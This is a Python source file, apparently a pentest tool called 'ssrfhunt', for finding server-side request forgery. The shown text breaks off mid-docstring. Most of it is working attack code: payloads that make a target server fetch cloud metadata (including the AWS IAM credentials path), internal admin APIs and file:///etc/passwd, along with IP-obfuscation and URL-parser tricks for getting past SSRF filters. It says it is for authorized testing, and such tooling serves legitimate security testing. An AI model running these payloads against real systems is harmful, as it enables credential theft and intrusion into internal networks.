#!/usr/bin/env python3
"""
ssrfhunt — Server-Side Request Forgery testing.

By DEFAULT this sends only OUT-OF-BAND probes (-b/--oob-domain) -- a
uniquely-labelled URL under a domain you control, nothing more. Reaching a
cloud metadata endpoint, an internal service, or reading a local file is a
more intrusive class of check (it makes the TARGET's own server talk to
real infrastructure, not just an attacker-controlled domain) and is opt-in
via --in-band.

Targets come from a URL (-u), a list of URLs (-l), or a raw HTTP request
file (-r) -- method, headers and body all preserved and reused for every
probe, with body fields (form or JSON, unless --no-forms) and header
values (unless --no-headers) tested alongside query parameters and path
segments. All three sources combine into one target list.

Two different kinds of evidence are confirmed here, and they are treated
very differently:

  OUT-OF-BAND (-b/--oob-domain, DEFAULT)  a uniquely-labelled URL under a
              domain you control is sent, then checked three ways:
                - ECHO (confirmable, in-band): some self-hosted
                  collaborator-style catchers respond to any request with
                  content derived from the subdomain label (this script
                  currently knows one scheme: the label reversed). That
                  derived value cannot pre-exist on the target's page and
                  cannot come from the app merely echoing our input -- so
                  finding it in the app's response, reproduced on replay,
                  is a CONFIRMED finding, with no need for --in-band since
                  nothing beyond the OOB domain you already control is
                  touched.
                - DNS LOG (confirmable, --dns-log): if the app's own fetch
                  never reflects anything back but did trigger a DNS lookup
                  your resolver logged, pointing --dns-log at that log file
                  confirms it after the fact by looking for the token.
                - BLIND (not confirmable here): neither of the above --
                  listed in an end-of-run manifest for you to correlate by
                  hand against your own collaborator/DNS logs.
              Without --oob-domain and without --in-band, there is nothing
              to test, and the script refuses to run.

  IN-BAND (--in-band)  the vulnerable app fetches the attacker-supplied URL
              and reflects (some of) what it got back -- an image proxy, a
              URL preview widget, a "test this webhook" button, a
              PDF-from-URL renderer. If the response contains real
              structure that only a cloud metadata service or an internal
              admin API would produce, and four gates all pass, that is a
              CONFIRMED finding. Off by default precisely because it is the
              more intrusive check: it drives the target's server into
              fetching from its own cloud metadata service and probing its
              own internal network, not merely into contacting a domain you
              already control for OOB.

Detection is signature-based, never status-code- or reflection-based. A 200
response or a generic error page proves nothing. Every in-band candidate
here must produce structure the payload itself did not contain -- AWS/GCP/
Azure/OCI metadata JSON keys, a Docker/Elasticsearch/Consul/RabbitMQ API
banner, a real /etc/passwd line -- and must then survive four gates:

  1. the payload URL must NOT appear verbatim in the response  (reflection)
  2. the baseline response must NOT already match               (page content)
  3. a non-routable control host must NOT match                 (catch-all page)
  4. the hit must reproduce on replay                           (one-off/cache)

Three IN-BAND payload families (--in-band), tried in order, stopping at the
first confirmed hit per injection point:

  1. CLOUD METADATA    169.254.169.254 (AWS, GCP, Azure, OCI all share this
                       link-local address, differing only by path and, for
                       GCP/Azure, a header this script's request to the
                       vulnerable app cannot set), 100.100.100.200 (Alibaba),
                       and the in-cluster Kubernetes API server. Usually the
                       highest-impact hit: it often hands over cloud
                       credentials.
  2. INTERNAL SERVICES  loopback/private-range admin APIs that should never
                       answer a request from outside: Docker Engine,
                       Elasticsearch, Consul, RabbitMQ, Prometheus, etcd,
                       Spring Actuator, Portainer.
  3. FILE SCHEME       file:///etc/passwd, file:///C:/Windows/win.ini, and
                       netdoc:///etc/passwd (a Java-only file:// equivalent)
                       -- the classic SSRF-to-LFI pivot, when the fetcher
                       honours one of them.

For (1) and (2), host-obfuscation variants are tried against a filter that
denylists the literal IP string but never actually parses the resulting
connect target: decimal, octal, hex, IPv6-mapped and *.nip.io spellings all
still route to the same address. An allowlist-bypass variant
(http://the-app's-own-domain@real-target/) is tried too, for filters that
substring-check the URL for an expected host rather than parsing it.

On confirmation this reads a capped proof and stops: a fragment of the
metadata JSON, the matched service banner, the first lines of /etc/passwd.
It does not walk the internal network, does not chase credentials found in
metadata, and does not use them. Proving the fetch is the finding.

For authorized testing only.
"""

from __future__ import annotations

import argparse
import concurrent.futures
import copy
import json
import os
import re
import secrets
import sys
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from urllib.parse import urlsplit, urlunsplit, parse_qsl, quote

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    sys.exit("[!] pip install requests")

UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

CRIT, HIGH, MED, LOW, INFO = "CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"

DEFAULT_TIMEOUT = 15.0
EXFIL_MAX_BYTES = 1024   # hard cap on proof-of-fetch
EXFIL_MAX_LINES = 12
DNS_LOG_TAIL_BYTES = 50 * 1024 * 1024   # only the most recent 50MB is read
MAX_JSON_BODY_FIELDS = 30               # cap on injectable JSON string fields

# A guaranteed-unassigned, globally non-routable address (RFC 5737 TEST-NET-1)
# used as the control host: same scheme/port/path as the confirmed payload,
# different host. If the signature still matches, the page produces it
# regardless of what gets fetched, and the candidate is dropped.
CONTROL_HOST = "192.0.2.1"
CONTROL_FILE = "nonexistent-ssrfhunt-4d9a1c"

# ----------------------------------------------------------------------------
# payloads
# ----------------------------------------------------------------------------

# Cloud instance-metadata endpoints. Each carries the regex that proves a
# real fetch happened -- structure the payload string itself cannot contain.
# GCP and Azure normally require a header (Metadata-Flavor / Metadata) on the
# request that reaches THEM -- a header this script has no way to set, since
# it is the vulnerable app's own outbound request, not this script's. They
# are kept here because a fraction of real integrations proxy headers
# through anyway (generic "HTTP debug"/webhook-replay features), but a lower
# hit rate on those two versus AWS is expected and is not a bug.
TARGETS_METADATA = [
    {"cloud": "AWS", "url": "http://169.254.169.254/latest/meta-data/",
     "re": re.compile(r"(?:^|\n)(ami-id|instance-id|instance-type|"
                      r"local-ipv4|public-ipv4|hostname|iam/|mac)\b", re.M),
     "label": "AWS IMDSv1 instance metadata"},
    {"cloud": "AWS",
     "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "re": re.compile(r"^[A-Za-z0-9_+=./-]{3,64}$", re.M),
     "label": "AWS IAM role list (credential path open)"},
    {"cloud": "GCP",
     "url": "http://169.254.169.254/computeMetadata/v1/?recursive=true",
     "re": re.compile(r'"(project|zone|machineType|serviceAccounts|instance)"',
                      re.I),
     "label": "GCP compute metadata"},
    {"cloud": "Azure",
     "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     "re": re.compile(r'"compute"\s*:\s*\{|"vmId"\s*:\s*"', re.I),
     "label": "Azure IMDS instance metadata"},
    {"cloud": "OCI", "url": "http://169.254.169.254/opc/v1/instance/",
     "re": re.compile(r'"availabilityDomain"\s*:|"compartmentId"\s*:'),
     "label": "Oracle Cloud instance metadata"},
    {"cloud": "Alibaba", "url": "http://100.100.100.200/latest/meta-data/",
     "re": re.compile(r"(?:^|\n)(instance-id|region-id|image-id|zone-id)\b",
                      re.M),
     "label": "Alibaba Cloud instance metadata"},
    {"cloud": "K8s", "url": "https://kubernetes.default.svc/api/",
     "re": re.compile(r'"kind"\s*:\s*"APIVersions"|"versions"\s*:\s*\['),
     "label": "Kubernetes API server (in-cluster)"},
]

# Internal / loopback services. Reachable only from inside the network the
# vulnerable app sits on -- a confirmed hit here is a confirmed boundary
# crossing on its own, independent of any cloud metadata question. Severity
# is HIGH rather than CRITICAL by default: reach is proven, but turning that
# reach into credential theft or RCE (e.g. creating a container via the
# Docker API) is a manual next step this script deliberately does not take.
TARGETS_INTERNAL = [
    {"port": 2375, "path": "/version",
     "re": re.compile(r'"ApiVersion"\s*:\s*"|"Os"\s*:\s*"(?:linux|windows)"'),
     "label": "Docker Engine API"},
    {"port": 9200, "path": "/",
     "re": re.compile(r'"cluster_name"\s*:|"you_know,_for_search"'),
     "label": "Elasticsearch"},
    {"port": 8500, "path": "/v1/agent/self",
     "re": re.compile(r'"Config"\s*:\s*\{.{0,300}"Datacenter"|"Member"\s*:\s*\{',
                      re.S),
     "label": "Consul agent API"},
    {"port": 15672, "path": "/api/overview",
     "re": re.compile(r'"rabbitmq_version"\s*:|"management_version"\s*:'),
     "label": "RabbitMQ management API"},
    {"port": 9090, "path": "/api/v1/status/config",
     "re": re.compile(r'"status"\s*:\s*"success".{0,60}"data"\s*:\s*\{', re.S),
     "label": "Prometheus API"},
    {"port": 2379, "path": "/version",
     "re": re.compile(r'"etcdserver"\s*:|"etcdcluster"\s*:'),
     "label": "etcd API"},
    {"port": 8080, "path": "/actuator/env",
     "re": re.compile(r'"activeProfiles"\s*:|"propertySources"\s*:'),
     "label": "Spring Boot Actuator (env)"},
    {"port": 9000, "path": "/api/status",
     "re": re.compile(r'"Version"\s*:\s*"[\d.]+"\s*,\s*"Edition"|>Portainer<',
                      re.I),
     "label": "Portainer API"},
]

# The SSRF-to-LFI pivot: the fetcher itself honours file:// or, on the JVM,
# netdoc:// (a Java-only wrapper with the same effect, listed on
# PayloadsAllTheThings for targets whose file:// handling chokes on
# embedded \n/\r). Same signatures as classic LFI, on purpose -- it is the
# same proof of a real read.
TARGETS_FILE = [
    {"os": "linux", "uri": "file:///etc/passwd",
     "re": re.compile(r"^[a-z_][a-z0-9_\-]{0,30}:[x*!]?:\d+:\d+:[^:]*:[^:]*:",
                      re.M),
     "label": "/etc/passwd via file://"},
    {"os": "windows", "uri": "file:///C:/Windows/win.ini",
     "re": re.compile(r"(?i)\[(?:fonts|extensions|mci extensions|files)\]"),
     "label": "C:\\Windows\\win.ini via file://"},
    {"os": "linux (Java)", "uri": "netdoc:///etc/passwd",
     "re": re.compile(r"^[a-z_][a-z0-9_\-]{0,30}:[x*!]?:\d+:\d+:[^:]*:[^:]*:",
                      re.M),
     "label": "/etc/passwd via netdoc:// (Java)"},
]

_IPV4_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")


def _is_ipv4(host: str) -> bool:
    return bool(_IPV4_RE.match(host or ""))


def ipv4_obfuscations(ip: str):
    """
    Alternate spellings of an IPv4 literal that a denylist-style SSRF filter
    (one that string-matches the literal address rather than parsing the
    resulting connect target) commonly fails to recognise, while every form
    still routes to the same address. Four octal prefixes are included
    because implementations genuinely differ on which one they accept
    (0177, o177, 0o177, q177 all appear as working forms in the wild).
    """
    octs = [int(o) for o in ip.split(".")]
    dec = (octs[0] << 24) + (octs[1] << 16) + (octs[2] << 8) + octs[3]
    return [
        ("plain",              ip),
        ("decimal",            str(dec)),
        ("octal",              ".".join(f"0{o:o}" for o in octs)),
        ("octal-o",            ".".join(f"o{o:o}" for o in octs)),
        ("octal-0o",           ".".join(f"0o{o:o}" for o in octs)),
        ("octal-q",            ".".join(f"q{o:o}" for o in octs)),
        ("hex",                f"0x{dec:08x}"),
        ("hex-dotted",         ".".join(f"0x{o:02x}" for o in octs)),
        ("ipv6-mapped",        f"[::ffff:{ip}]"),
        ("ipv6-mapped-full",   f"[0:0:0:0:0:ffff:{ip}]"),
        ("nip.io",             f"{ip}.nip.io"),
    ]


# Loopback-only spellings that are not derivable from the IP itself: the
# 127.0.0.0/8 block is entirely reserved for loopback (RFC 3330), so any
# address in it -- not just 127.0.0.1 -- routes to the local machine, and a
# filter that only denylists the literal "127.0.0.1" string misses the rest
# of the block outright.
LOOPBACK_EXTRA = [
    ("localhost",       "localhost"),
    ("short",           "127.1"),
    ("short-3part",     "127.0.1"),
    ("bareword",        "0"),
    ("wildcard",        "0.0.0.0"),
    ("cidr-alt1",       "127.127.127.127"),
    ("cidr-alt2",       "127.0.1.3"),
    ("cidr-alt3",       "127.0.0.0"),
    ("ipv6",            "[::1]"),
    ("ipv6-full",       "[0000::1]"),
    ("ipv6-unspecified","[::]"),
    ("ipv6-compat",     "[::127.0.0.1]"),
    ("ip6-localhost",   "ip6-localhost"),
    ("ip6-loopback",    "ip6-loopback"),
    ("sslip.io",        "127.0.0.1.sslip.io"),
    ("nip.io-labelled", "company.127.0.0.1.nip.io"),
    ("localtest.me",    "localtest.me"),
    ("localh.st",       "localh.st"),
]


def loopback_hosts():
    return ipv4_obfuscations("127.0.0.1") + LOOPBACK_EXTRA


def metadata_hosts(ip: str):
    return ipv4_obfuscations(ip)


def _mk_url(scheme: str, host: str, port, path: str, query: str = "") -> str:
    netloc = host if not port else f"{host}:{port}"
    return urlunsplit((scheme, netloc, path, query, ""))




# Different HTTP client/validation libraries resolve the "authority" of a
# URL differently around these separators (Orange Tsai, "A New Era Of SSRF
# -- Exploiting URL Parser In Trending Programming Languages"). Each form
# puts a believable bait host up front -- typically the vulnerable app's
# own domain, to pass a naive substring/allow-list check -- while the real
# target follows the separator that a given parsing/fetching library
# actually honours.
#
# The bait ALWAYS carries an explicit :port, because that is what triggers
# the discrepancy: a parser that reads the authority up to the first ':'
# takes the bait as host and everything after as a (malformed) port, while
# a parser that honours the '@'/'\'/'#' lands on the real target instead.
# These reproduce, byte for byte, the payload shapes listed under "Bypass
# Abusing URL Parsing Discrepancy" on PayloadsAllTheThings:
#     http://BAIT:80\@TARGET:80/     http://BAIT:80\@@TARGET:80/
#     http://BAIT:80:\@@TARGET:80/   http://BAIT:80#\@TARGET:80/
# built via _parser_discrepancy_authorities() below, which fills in the
# real bait/target/ports.
_PARSER_DISCREPANCY_FORMS = [
    ("userinfo-bypass",         "{bait}:{bport}@{target}:{tport}"),
    ("backslash-at-bypass",     "{bait}:{bport}\\@{target}:{tport}"),
    ("double-at-bypass",        "{bait}:{bport}\\@@{target}:{tport}"),
    ("colon-backslash-bypass",  "{bait}:{bport}:\\@@{target}:{tport}"),
    ("fragment-at-bypass",      "{bait}:{bport}#\\@{target}:{tport}"),
]


def _parser_discrepancy_authorities(bait, target, control, port, bait_port=80):
    """
    Yield (name, payload_authority, control_authority) for each URL-parser
    discrepancy form, with an explicit port on both bait and real host so
    the confusion actually fires (see _PARSER_DISCREPANCY_FORMS). 'port' is
    the real target's port; 'bait_port' is a plausible-looking port on the
    attacker-supplied bait host (80 by default).
    """
    for name, tmpl in _PARSER_DISCREPANCY_FORMS:
        p = tmpl.format(bait=bait, bport=bait_port, target=target, tport=port)
        c = tmpl.format(bait=bait, bport=bait_port, target=control, tport=port)
        yield name, p, c


def _qval(payload: str) -> str:
    """
    Percent-encode only the bytes that would break the OUTER query/form
    string (&, #) or get stripped in transit (space). Everything else --
    :, /, ?, @, ., digits -- survives raw, because Http sends the literal
    value untouched. A filter that only URL-decodes once must still see the
    obfuscated host spellings exactly as sent.
    """
    return payload.replace("&", "%26").replace("#", "%23").replace(" ", "%20")


# Parameters worth testing when a URL carries none of its own (on by
# default; --no-guess disables it). Scoped to the query string only -- it
# does not fabricate body fields.
COMMON_PARAMS = ["url", "uri", "path", "dest", "redirect", "next", "continue",
                 "callback", "webhook", "target", "src", "image", "avatar",
                 "feed", "proxy", "out", "return", "link", "file", "u", "q"]

# Parameter names that typically carry a value the app fetches server-side.
# Used only to ORDER testing (most-likely-vulnerable first) -- every
# non-noise parameter is still tested, named or not, because SSRF regularly
# hides behind unremarkable names too.
URL_LIKE_PARAMS = {
    "url", "uri", "link", "href", "src", "source", "dest", "destination",
    "redirect", "redirect_uri", "redirect_url", "return", "return_url",
    "returnto", "next", "continue", "callback", "callback_url", "webhook",
    "webhook_url", "target", "domain", "host", "endpoint", "feed", "feed_url",
    "avatar", "avatar_url", "image", "image_url", "img", "img_url", "proxy",
    "proxy_url", "forward", "site", "path", "load", "fetch", "fetch_url",
    "api", "api_url", "out", "view", "window", "ref", "reference", "file",
    "document", "doc", "resource", "resource_url", "data", "u", "to",
    "content_url", "preview", "preview_url", "import", "import_url", "share",
    "share_url", "notify", "notify_url", "ping",
}

# Advertising parameters never reach a server-side fetch. Skipping them keeps
# the request budget on parameters that might actually be vulnerable.
NOISE_PARAMS = {"gclid", "gbraid", "wbraid", "gad_source", "msclkid", "fbclid",
                "dclid", "cto_pld", "awc", "mc_cid", "mc_eid", "igshid",
                "utm_source", "utm_medium", "utm_campaign", "utm_term",
                "utm_content", "_ga", "_gl", "yclid", "ttclid", "epik"}

# Headers never worth testing (-r, --no-headers to disable entirely): hop-by-
# hop framing, content negotiation, and anything whose value authenticates
# the request rather than routing it -- replacing Cookie or Authorization
# would just break the request's own auth instead of testing anything.
HEADER_SKIP = {"host", "content-length", "content-type", "transfer-encoding",
              "connection", "cookie", "authorization", "accept",
              "accept-encoding", "accept-language", "cache-control",
              "pragma", "user-agent", "upgrade-insecure-requests",
              "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
              "sec-fetch-dest", "te", "expect"}


# ----------------------------------------------------------------------------
# colour
# ----------------------------------------------------------------------------

ANSI = {
    CRIT: "\033[1;95m", HIGH: "\033[1;91m", MED: "\033[1;93m",
    LOW: "\033[1;96m", INFO: "\033[0;37m",
    "ok": "\033[1;92m", "warn": "\033[0;93m", "bad": "\033[0;91m",
    "bad_b": "\033[1;91m",
    "dim": "\033[0;90m", "b": "\033[1m", "head": "\033[1;36m", "x": "\033[0m",
}
_COLOR = True


def set_color(enabled):
    global _COLOR
    _COLOR = enabled


def paint(s, key):
    return s if not _COLOR else f"{ANSI.get(key, '')}{s}{ANSI['x']}"


def status_key(code):
    try:
        code = int(code)
    except (TypeError, ValueError):
        return "dim"
    if 200 <= code < 300:
        return "ok"
    if code in (401, 403):
        return "warn"
    if 500 <= code < 600:
        return "bad"
    return "dim"


# ----------------------------------------------------------------------------
# status
# ----------------------------------------------------------------------------

class Status:
    """
    Periodic heartbeat for list mode (-l), on a timer from a daemon thread so
    it fires at a steady wall-clock interval regardless of verbosity and of
    how long any one host takes. Whole lines, not an in-place redraw: at -v 1
    output scrolls continuously and an in-place indicator would be unreadable.
    """

    def __init__(self, console, total, interval=30.0, enabled=True):
        self.con = console
        self.total = total
        self.interval = interval
        self.enabled = enabled
        self.done = 0
        self.tests = 0
        self.counts = {CRIT: 0, HIGH: 0, MED: 0, LOW: 0, INFO: 0}
        self._lk = threading.Lock()
        self._stop = threading.Event()
        self._thread = None
        self._t0 = 0.0

    def start(self):
        if not self.enabled:
            return
        self._t0 = time.time()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        while not self._stop.wait(self.interval):
            self.emit()

    def host_done(self, n=1):
        with self._lk:
            self.done += n

    def test_done(self, n=1):
        with self._lk:
            self.tests += n

    def record(self, sev):
        with self._lk:
            if sev in self.counts:
                self.counts[sev] += 1

    def emit(self, label="status"):
        if not self.enabled:
            return
        with self._lk:
            done, tests, c = self.done, self.tests, dict(self.counts)
        remaining = max(0, self.total - done)
        el = int(time.time() - self._t0)
        self.con.line(paint(
            f"  [{label} {el // 60:02d}:{el % 60:02d}]  "
            f"tested {done}/{self.total}  remaining {remaining}  "
            f"payloads {tests}  |  "
            f"crit {c[CRIT]}  high {c[HIGH]}  med {c[MED]}  "
            f"low {c[LOW]}  info {c[INFO]}", "head"))

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=1)


# ----------------------------------------------------------------------------
# console
# ----------------------------------------------------------------------------

class Console:
    def __init__(self, verbosity=0):
        self.v = verbosity
        self._lk = threading.Lock()

    def line(self, s=""):
        with self._lk:
            print(s, flush=True)

    def banner(self, s):
        if self.v >= 1:
            self.line("\n" + paint(f"=== {s} ===", "head"))

    def info(self, s):
        if self.v >= 1:
            self.line(paint(f"    {s}", "dim"))

    def debug(self, s):
        if self.v >= 2:
            self.line(paint(f"    {s}", "dim"))

    def skip(self, s):
        if self.v >= 1:
            self.line(paint(f"  [skip] {s}", "dim"))

    def error(self, s):
        self.line(paint(f"  [err] {s}", "bad"))

    def test(self, host, what, code, note=""):
        """Every probe, at -v 1. This is the 'display all tests' mode."""
        if self.v < 1:
            return
        self.line(f"  {paint('·', 'dim')}  {host}  {what:<44} "
                  f"{paint(str(code), status_key(code)):<14} {paint(note, 'dim')}")

    def finding(self, f):
        """Confirmed findings only -- printed at every verbosity, including 0."""
        self.line("")
        self.line(f"  {paint('[' + f.sev + ']', f.sev)} {paint(f.title, 'b')}")
        if f.verified_note:
            self.line(f"  {paint(f.verified_note, 'bad_b')}")
        self.line(f"    URL       : {f.url}")
        self.line(f"    Parameter : {f.param}")
        if f.evidence:
            for ln in f.evidence.split("\n"):
                self.line(f"    Evidence  : {ln}")
        if f.proof:
            self.line(f"    {paint('--- proof of fetch (capped) ---', 'b')}")
            for ln in f.proof.split("\n"):
                self.line(f"      {paint(ln, 'ok')}")
        if f.curl:
            self.line(f"    PoC       : {paint(f.curl, 'warn')}")
        self.line("")


# ----------------------------------------------------------------------------
# model
# ----------------------------------------------------------------------------

@dataclass
class Finding:
    title: str
    url: str
    param: str
    sev: str = HIGH
    evidence: str = ""
    proof: str = ""
    curl: str = ""
    verified_note: str = ""   # shown in bold red when set (e.g. DNS-log confirmation)
    when: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())


@dataclass
class Resp:
    status: int
    body: str
    headers: dict = field(default_factory=dict)
    error: str = ""

    @property
    def ok(self):
        return not self.error

    def header(self, name, default=""):
        for k, v in self.headers.items():
            if k.lower() == name.lower():
                return v
        return default


@dataclass
class ReqSpec:
    """
    One full request: method, absolute URL, headers, and body. -u/-l build
    a plain GET with no extra headers; -r carries the parsed method,
    headers and body of the captured request through untouched, so every
    probe reaches the vulnerable code path the same way the original
    request did (same verb, same cookies/auth, same unrelated body fields).
    """
    method: str = "GET"
    url: str = ""
    headers: dict = field(default_factory=dict)
    body: str | None = None


# ----------------------------------------------------------------------------
# http
# ----------------------------------------------------------------------------

class _RawTargetAdapter(requests.adapters.HTTPAdapter):
    """
    A requests adapter that sends the request-target (path + query) with its
    bytes preserved EXACTLY as given -- in particular a literal backslash,
    which urllib3 2.x otherwise percent-encodes to %5C while parsing the URL.

    That backslash matters: several of the URL-parser-discrepancy bypasses
    (Orange Tsai) depend on the vulnerable server's own parser seeing a raw
    '\\' before the '@'. curl sends it raw; urllib3 does not. To match curl,
    the desired request-target is stashed on the PreparedRequest, and just
    for the duration of that one send the low-level http.client putrequest
    is wrapped to emit the stashed target verbatim, keyed by thread id so
    concurrent probes on other threads are unaffected. Only the request LINE
    is touched; host resolution, TLS and the rest go through the normal
    stack. Anything unexpected falls back to the normal path (the wrapper
    only overrides when THIS thread has a target set), so a request without
    a backslash, or on a future urllib3, behaves exactly as before.
    """

    _tls = threading.local()
    _patched = False
    _patch_lock = threading.Lock()

    @classmethod
    def _install_patch(cls):
        if cls._patched:
            return
        with cls._patch_lock:
            if cls._patched:
                return
            import http.client as _hc
            real_putrequest = _hc.HTTPConnection.putrequest

            def putrequest(self, method, url, *a, **k):
                target = getattr(_RawTargetAdapter._tls, "target", None)
                if target is not None:
                    url = target
                return real_putrequest(self, method, url, *a, **k)
            _hc.HTTPConnection.putrequest = putrequest
            cls._patched = True

    def send(self, request, **kwargs):
        raw_target = getattr(request, "_raw_target", None)
        if not raw_target:
            return super().send(request, **kwargs)
        self._install_patch()
        self._tls.target = raw_target
        try:
            return super().send(request, **kwargs)
        finally:
            self._tls.target = None


class Http:
    def __init__(self, console, timeout=DEFAULT_TIMEOUT, delay=0.0, proxy=None,
                 extra_headers=None, verify=False):
        self.con = console
        self.timeout = timeout
        self.verify = verify
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self.default_headers = {"User-Agent": UA}
        self.cli_headers = {}
        for h in extra_headers or []:
            if ":" in h:
                k, _, v = h.partition(":")
                self.cli_headers[k.strip()] = v.strip()
        self._min_gap = max(0.0, delay)
        self._next = 0.0
        self._rate_lk = threading.Lock()
        self._cnt_lk = threading.Lock()
        self._local = threading.local()
        self.count = 0

    def _session(self):
        s = getattr(self._local, "s", None)
        if s is None:
            s = requests.Session()
            adapter = _RawTargetAdapter()
            s.mount("http://", adapter)
            s.mount("https://", adapter)
            self._local.s = s
        return s

    def _throttle(self):
        if self._min_gap <= 0:
            return
        with self._rate_lk:
            now = time.monotonic()
            wait = max(0.0, self._next - now)
            self._next = max(now, self._next) + self._min_gap
        if wait:
            time.sleep(wait)

    def request(self, method: str, url: str, headers: dict = None,
               body: str = None) -> Resp:
        """
        Send one request, preserving the literal URL and body byte-for-byte.
        Header precedence, lowest to highest: default User-Agent < headers
        carried from a -r request template < -H flags on the command line
        -- an explicit CLI override always wins over a captured request's
        own header.
        """
        self._throttle()
        with self._cnt_lk:
            self.count += 1
        h = dict(self.default_headers)
        if headers:
            h.update(headers)
        h.update(self.cli_headers)
        data = body.encode("utf-8") if isinstance(body, str) else body
        try:
            # The literal query must survive: requests re-encodes percent
            # sequences while preparing a URL, which would collapse our
            # %26/%23 escapes -- or a filter-bypass %-sequence embedded in
            # the payload -- back to their raw characters and silently
            # corrupt the injected value. Preparing against a query-less URL
            # and overwriting .url afterwards sidesteps that; the body is
            # never URL-encoded so it always survives untouched regardless.
            parts = urlsplit(url)
            safe = urlunsplit((parts.scheme, parts.netloc, "/", "", ""))
            req = requests.Request(method, safe, headers=h, data=data).prepare()
            req.url = url
            # A raw backslash in the request-target is percent-encoded by
            # urllib3 2.x, which neutralises the parser-discrepancy bypasses
            # that rely on the server's parser seeing a literal '\' before
            # '@'. curl sends it raw; to match, stash the exact request-
            # target so _RawTargetAdapter writes it verbatim. Only kicks in
            # when a backslash is actually present -- every other request
            # takes the normal, unpatched path.
            if "\\" in url:
                target = urlunsplit(("", "", parts.path or "/", parts.query, ""))
                req._raw_target = target
            r = self._session().send(req, timeout=self.timeout,
                                     verify=self.verify, proxies=self.proxies,
                                     allow_redirects=False)
            return Resp(r.status_code, r.text[:300000], dict(r.headers))
        except requests.RequestException as e:
            return Resp(0, "", {}, error=str(e))

    def get(self, url: str, headers: dict = None) -> Resp:
        return self.request("GET", url, headers=headers)

    def send(self, spec: ReqSpec) -> Resp:
        return self.request(spec.method, spec.url, spec.headers, spec.body)


# ----------------------------------------------------------------------------
# scanner
# ----------------------------------------------------------------------------

# Segments that are identifiers rather than route names, collapsed so that
# /product/123/detail and /product/456/detail are recognised as one template.
_SEG_NUMERIC = re.compile(r"^\d+$")
_SEG_UUID = re.compile(
    r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$", re.I)
_SEG_HEX = re.compile(r"^[0-9a-f]{16,}$", re.I)
_SEG_DATE = re.compile(r"^\d{4}-\d{2}-\d{2}$")


def normalise_path(path: str) -> str:
    out = []
    for s in path.split("/"):
        if not s:
            continue
        if _SEG_NUMERIC.match(s):
            out.append("{n}")
        elif _SEG_UUID.match(s):
            out.append("{uuid}")
        elif _SEG_DATE.match(s):
            out.append("{date}")
        elif _SEG_HEX.match(s):
            out.append("{hex}")
        else:
            out.append(s.lower())
    return "/" + "/".join(out)


class SsrfHunter:
    def __init__(self, http: Http, con: Console, args, status: Status = None):
        self.http = http
        self.con = con
        self.args = args
        self.status = status
        self.findings: list[Finding] = []
        self.skipped: list[dict] = []
        self.oob_sent: list[dict] = []
        self._seen: set[tuple] = set()
        self.deduped = 0
        self._lk = threading.Lock()

    def add(self, f: Finding):
        with self._lk:
            self.findings.append(f)
        if self.status:
            self.status.record(f.sev)
        self.con.finding(f)

    def _probe(self):
        if self.status:
            self.status.test_done()

    # ---- request building: query and path (URL only)

    def _build(self, url: str, param: str, value: str) -> str:
        """
        Replace one parameter's value, leaving every other byte untouched.
        If the parameter is not already in the URL, it is APPENDED instead
        of silently dropped -- this is the common case for --guess
        candidates and for --param names the URL didn't already carry, and
        without this every guessed/forced name would build byte-for-byte
        the same, parameter-less URL instead of ever actually being tested.
        """
        parts = urlsplit(url)
        pairs = parse_qsl(parts.query, keep_blank_values=True)
        names = {k for k, _ in pairs}
        out = [f"{k}={_qval(value)}" if k == param else f"{k}={quote(v, safe='')}"
               for k, v in pairs]
        if param not in names:
            out.append(f"{param}={_qval(value)}")
        return urlunsplit((parts.scheme, parts.netloc, parts.path,
                           "&".join(out), parts.fragment))

    def _build_path(self, url: str, index: int, value: str) -> str:
        """
        Replace the index-th non-empty path segment with the payload, fully
        URL-encoded. Unlike a traversal fragment, an SSRF payload is a whole
        URL of its own (scheme, host, slashes) and would otherwise fracture
        the outer path into extra segments -- some routers do accept a
        route-embedded target this way (/proxy/<url-encoded-target>,
        /thumbnail/<url-encoded-target>), which is exactly what this tests.
        """
        parts = urlsplit(url)
        segs = parts.path.split("/")
        n = -1
        for i, s in enumerate(segs):
            if not s:
                continue
            n += 1
            if n == index:
                segs = segs[:i] + [quote(value, safe='')] + segs[i + 1:]
                break
        return urlunsplit((parts.scheme, parts.netloc, "/".join(segs),
                           parts.query, parts.fragment))

    # ---- request building: body (form or JSON, -r only)

    def _body_content_type(self, headers: dict) -> str:
        for k, v in (headers or {}).items():
            if k.lower() == "content-type":
                return v.lower()
        return ""

    def _with_form_body(self, body: str, name: str, value: str) -> str:
        pairs = parse_qsl(body, keep_blank_values=True)
        names = {k for k, _ in pairs}
        out = [f"{k}={_qval(value)}" if k == name else f"{k}={quote(v, safe='')}"
               for k, v in pairs]
        if name not in names:
            out.append(f"{name}={_qval(value)}")
        return "&".join(out)

    def _with_json_body(self, data, path: tuple, value: str) -> str:
        d = copy.deepcopy(data)
        node = d
        for key in path[:-1]:
            node = node[key]
        node[path[-1]] = value
        return json.dumps(d)

    def _json_string_paths(self, node, prefix=()):
        """Every string-valued leaf in a JSON structure, at any depth."""
        paths = []
        if isinstance(node, dict):
            for k, v in node.items():
                paths.extend(self._json_string_paths(v, prefix + (k,)))
        elif isinstance(node, list):
            for i, v in enumerate(node):
                paths.extend(self._json_string_paths(v, prefix + (i,)))
        elif isinstance(node, str):
            paths.append(prefix)
        return paths

    def _body_points(self, base: ReqSpec):
        """
        Injection points inside a request body -- every form-urlencoded
        field, or every string value anywhere in a JSON body (nested
        objects and arrays included, capped at MAX_JSON_BODY_FIELDS).
        Multipart and any other body encoding is not parsed here --
        reconstructing a valid multipart body with one field swapped is
        real work for a shape this uncommon a target; query and path
        injection still run normally on such a request, only the body
